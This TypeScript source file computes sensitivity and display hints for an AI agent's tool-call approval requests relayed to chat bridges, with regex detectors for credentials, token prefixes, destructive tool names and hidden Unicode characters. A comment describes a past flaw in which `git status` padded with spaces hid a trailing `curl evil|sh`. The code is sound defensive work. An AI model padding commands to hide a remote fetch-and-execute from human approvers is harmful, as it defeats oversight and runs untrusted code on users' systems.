/**
 * @license
 * Copyright 2025 Qwen Team
 * SPDX-License-Identifier: Apache-2.0
 */

/** Cap on `argsSummaryFull` so an enriched SSE frame can't grow unbounded. */
const MAX_FULL_BYTES = 4096;
/** Cap on the human short summary (spec: ≤140 chars). */
const MAX_SHORT = 140;

/**
 * Characters that change what a chat shows without showing themselves: Unicode
 * format controls (bidi overrides and isolates, zero-width spaces and joiners,
 * the BOM, soft hyphen, tag characters) and the line/paragraph separators JSON
 * leaves unescaped. A summary containing one is not a faithful picture of the
 * call, so it is never approvable inline (#168).
 */
const HIDDEN_TEXT_RE = /[\p{Cf}\u2028\u2029]/u;

/**
 * Cut `s` to the short-summary cap with a visible marker that says how much was
 * dropped, so a reader never mistakes a prefix for the whole call. The marker is
 * sized for the largest count it could report, which keeps the result within
 * the cap; a surrogate pair is never split.
 */
function truncateSummary(s: string): string {
  if (s.length <= MAX_SHORT) return s;
  const marker = (dropped: number) => `…(+${dropped} more chars)`;
  let keep = MAX_SHORT - marker(s.length).length;
  const last = s.charCodeAt(keep - 1);
  if (last >= 0xd800 && last <= 0xdbff) keep -= 1;
  return `${s.slice(0, keep)}${marker(s.length - keep)}`;
}

/**
 * Secret-looking content in tool-call args — a key or value that smells like a
 * credential. Conservative (false-positives just downgrade to a deeplink).
 *
 * Beyond the keyword matches, this also matches specific high-signal formats
 * that carry NO adjacent keyword at all:
 *  - PEM key headers (`-----BEGIN PRIVATE KEY-----`, `-----BEGIN RSA PRIVATE
 *    KEY-----`, etc.) — the keyword alternative `private[_-]?key` only matches
 *    an underscore/hyphen form and never matches the PEM header's literal
 *    space + ALL-CAPS text.
 *  - Bare vendor token prefixes: GitHub (`ghp_`, `github_pat_`, `gho_`,
 *    `ghu_`, `ghs_`), Slack (`xoxb-`/`xoxp-`/`xoxa-`/`xoxr-`/`xoxs-`), AWS
 *    access key ids (`AKIA...`), and OpenAI/Anthropic-style API keys
 *    (`sk-...`, including `sk-ant-...`).
 *
 * Every added alternative is a literal (or small bounded character class)
 * prefix match with no nested/overlapping quantifiers, so matching stays
 * bounded/near-linear in practice: the `[A-Z ]*` class inside the PEM
 * alternative is only entered after the literal `-----BEGIN ` prefix has
 * matched, so it cannot chain with another quantifier to blow up. Note this
 * regex runs (below) on the RAW, uncapped `rawFull` string — the
 * `MAX_FULL_BYTES` length cap is applied afterward, only to the value stored
 * in `argsSummaryFull`.
 */
const SECRET_RE =
  /(api[_-]?key|secret|token|password|passwd|credential|authorization|bearer|private[_-]?key|client[_-]?secret|access[_-]?key|-----BEGIN [A-Z ]*PRIVATE KEY-----|ghp_|github_pat_|gho_|ghu_|ghs_|xox[baprs]-|AKIA[0-9A-Z]{16}|sk-(ant-)?[A-Za-z0-9]{10,})/i;

/** Mutating/destructive tool names → at least medium sensitivity. */
const DANGEROUS_TOOL_RE =
  /(write|edit|delete|remove|^rm$|run[_-]?shell|shell|exec|create|move|rename|patch|apply)/i;

export type BridgeSensitivity = 'low' | 'medium' | 'high';
export type BridgeSurface = 'inline' | 'deeplink';

/**
 * Advisory render hints on a `permission_request`, per the `add-bridge-protocol`
 * contract (the field vocabulary discord/matrix bridges also consume). A bridge
 * uses `recommendedSurface` to decide between inlining args into the chat message
 * (`inline`) and showing a short summary + "open in web client" deeplink
 * (`deeplink`) — so secrets aren't echoed into a group chat and a huge diff isn't
 * dumped into Telegram.
 */
export interface BridgeHints {
  /** ≤140-char human summary (secret args are redacted out of this). */
  argsSummaryShort: string;
  /** Canonical full args (capped); bridges MUST NOT render this in deeplink mode. */
  argsSummaryFull: string;
  /** Deterministic sensitivity classification given tool name + args. */
  sensitivity: BridgeSensitivity;
  /**
   * `inline` only when `argsSummaryShort` shows the whole call; `deeplink` when
   * high-sensitivity OR the summary had to be cut OR it holds hidden text.
   */
  recommendedSurface: BridgeSurface;
}

/**
 * Compute {@link BridgeHints} for a tool call. PURE + total (never throws — a
 * weird/unserializable shape degrades to a safe deeplink). The classification is
 * DETERMINISTIC given the tool name + args (spec requirement): a secret-looking
 * key/value → `high`; a mutating tool → at least `medium`; else `low`.
 *
 * `recommendedSurface` is `inline` (Approve offered in the chat) only when the
 * short summary the chat shows IS the whole call: it fits the 140-char cap and
 * carries no invisible or direction-changing characters. Otherwise the summary
 * is cut with a visible marker and the decision goes to the web client (#168).
 * Before, the chat showed the first 140 characters with no marker while Approve
 * covered up to 2048, so `git status<200 spaces>; curl evil|sh` was approved
 * with its tail unseen.
 */
export function computeBridgeHints(toolCall: unknown): BridgeHints {
  const tc =
    toolCall && typeof toolCall === 'object'
      ? (toolCall as Record<string, unknown>)
      : {};
  const name = typeof tc['name'] === 'string' ? tc['name'] : 'tool';
  const subject = 'args' in tc ? tc['args'] : tc;

  let rawFull: string;
  try {
    rawFull = JSON.stringify(subject ?? {}) ?? '';
  } catch {
    // Circular / unserializable → treat as high-risk, deeplink, redacted.
    return {
      argsSummaryShort: `${name} (args unavailable)`.slice(0, MAX_SHORT),
      argsSummaryFull: '(unserializable args)',
      sensitivity: 'high',
      recommendedSurface: 'deeplink',
    };
  }

  const secret = SECRET_RE.test(rawFull);
  const sensitivity: BridgeSensitivity = secret
    ? 'high'
    : DANGEROUS_TOOL_RE.test(name)
      ? 'medium'
      : 'low';
  const summary = `${name} ${rawFull}`.trim();
  const shownWhole =
    summary.length <= MAX_SHORT && !HIDDEN_TEXT_RE.test(summary);
  const recommendedSurface: BridgeSurface =
    sensitivity === 'high' || !shownWhole ? 'deeplink' : 'inline';

  // Never put a possible secret in the short summary (it may be inlined to chat).
  const argsSummaryShort = secret
    ? `${name} (sensitive args hidden)`.slice(0, MAX_SHORT)
    : truncateSummary(summary);
  const argsSummaryFull =
    rawFull.length > MAX_FULL_BYTES
      ? `${rawFull.slice(0, MAX_FULL_BYTES)}…[truncated]`
      : rawFull;

  return { argsSummaryShort, argsSummaryFull, sensitivity, recommendedSurface };
}
